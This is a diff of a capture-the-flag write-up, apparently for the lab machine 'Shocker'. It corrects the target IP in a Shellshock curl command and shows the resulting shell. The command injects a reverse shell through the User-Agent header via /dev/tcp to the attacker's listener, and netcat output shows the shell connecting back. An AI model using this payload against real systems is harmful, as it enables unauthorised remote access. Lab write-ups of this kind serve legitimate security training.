@@ -22,7 +22,7 @@ http://10.10.10.56/cgi-bin/user.sh
 
 To get a reverse shell I changed it to this: </br>
 ```bash
-curl -A "() { :; }; echo Content-Type: text/plain ; echo ; echo ; /bin/bash -i >& /dev/tcp/10.10.14.32/1234 0>&1" http://10.10.10.65/cgi-bin/user.sh
+curl -A "() { :; }; echo Content-Type: text/plain ; echo ; echo ; /bin/bash -i >& /dev/tcp/10.10.14.32/1234 0>&1" http://10.10.10.56/cgi-bin/user.sh
 ``` 
 </br>
 
@@ -34,7 +34,8 @@ listening on [any] 1234 ...
 connect to [10.10.14.32] from (UNKNOWN) [10.10.10.56] 45314
 bash: no job control in this shell
 shelly@Shocker:/usr/lib/cgi-bin$
-``` </br>
+``` 
+</br>
 
 # Privilege Escalation: 
 
